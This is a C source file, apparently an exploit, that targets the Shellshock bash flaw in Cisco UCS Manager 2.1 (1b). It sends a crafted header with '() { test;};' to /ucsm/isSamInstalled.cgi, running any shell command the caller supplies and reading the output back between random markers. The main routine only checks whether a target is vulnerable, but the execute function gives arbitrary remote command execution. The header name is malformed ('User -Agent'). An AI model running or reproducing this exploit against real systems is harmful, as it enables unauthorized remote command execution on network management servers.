// "Cisco UCS Manager 2.1 (1b)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192

char *random_text(int length) {
    char *text = malloc(length + 1);
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < length; i++) {
        text[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    text[length] = '\0';
    return text;
}

char *execute(const char *target_ip, int port, const char *cmd) {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024];
    char response[MAX_RESPONSE_SIZE];
    char *mark = random_text(32);
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return NULL;
    }

    snprintf(request, sizeof(request),
             "GET /ucsm/isSamInstalled.cgi HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User -Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; echo %s; echo \"$(%s)\"; echo %s;\r\n"
             "Connection: close\r\n\r\n",
             target_ip, mark, cmd, mark);

    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        free(mark);
        return NULL;
    }

    response[bytes_received] = '\0';
    char *result = strstr(response, mark);
    free(mark);

    if (result) {
        char *start = result + strlen(mark);
        char *end = strstr(start, mark);
        if (end) {
            size_t length = end - start;
            char *output = malloc(length + 1);
            strncpy(output, start, length);
            output[length] = '\0';
            return output;
        }
    }
    return NULL;
}

int check(const char *target_ip, int port) {
    char *mark = random_text(32);
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "echo %s", mark);
    char *response = execute(target_ip, port, cmd);
    int is_vulnerable = (response && strstr(response, mark) != NULL);
    free(response);
    free(mark);
    return is_vulnerable;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    if (check(target_ip, port)) {
        printf("Target is vulnerable\n");
    } else {
        printf("Target is not vulnerable\n");
    }
    return 0;
}
